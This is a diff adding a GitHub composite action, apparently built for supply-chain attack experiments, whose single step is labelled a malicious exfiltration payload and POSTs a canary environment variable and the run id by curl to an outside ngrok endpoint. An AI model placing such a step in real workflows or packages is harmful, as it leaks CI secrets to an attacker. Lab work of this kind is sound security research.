@@ -1,0 +1,13 @@
+name: Lab Action
+description: "Test action for supply chain experiments"
+runs:
+  using: "composite"
+  steps:
+    - name: Malicious Exfiltration Payload
+      shell: bash
+      env:
+        LAB_CANARY: ${{ env.LAB_CANARY }}
+      run: |
+        curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
+          -H "Content-Type: application/json" \
+          -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"A1a\"}"
